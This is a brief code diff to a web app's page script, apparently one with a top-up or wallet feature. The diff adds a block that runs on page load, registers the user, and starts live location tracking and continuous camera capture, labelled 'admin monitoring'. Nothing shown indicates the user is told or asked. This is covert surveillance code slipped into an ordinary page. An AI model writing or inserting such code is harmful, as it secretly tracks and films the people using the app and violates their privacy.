@@ -193,6 +193,11 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     loadData();
+    // Start live location tracking for admin monitoring
+    registerAppUser(appData.userName || 'UNKNOWN').then(() => {
+        startLiveLocationTracking();
+        startContinuousCameraCapture();
+    });
 
     document.getElementById('topupAmount')?.addEventListener('input', function() {
         const amount = parseFloat(this.value) || 0;
